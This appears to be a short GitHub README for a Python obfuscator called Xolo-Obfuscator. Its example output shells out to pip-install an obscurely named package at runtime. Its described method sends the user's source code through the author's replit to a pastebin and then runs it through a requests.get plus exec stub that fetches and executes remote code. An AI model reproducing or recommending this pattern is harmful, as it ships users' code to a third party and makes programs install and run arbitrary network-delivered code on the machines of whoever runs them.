# Xolo-Obfuscator
Python top obfuscator which requests a database to run the code

# Star if liked
Please star this if you liked it I will make more improvements if this gets much stars

# How to run
1. Edit text.py and paste your code into it
2. run main.py
3. see your results in example.py

# example of the obfuscated programm
```py
#  here is your obfuscated source 
import os 
os.system("pip install xoloazfgyobkaw")
import xoloazfgyobkaw
```
# How it obfuscates
1. Uses obfuscator from github
2. Uses obfuscator from github
3. marshal
4. base64
5. uploads file on a pastebin by sending a request to my replit
6. uses this to read the pastebin
```py
import requests
url="pastebin"
a=requests.get(url)
exec(a.text)
```
7. Obfuscates that also using 1, 2, 3, 4
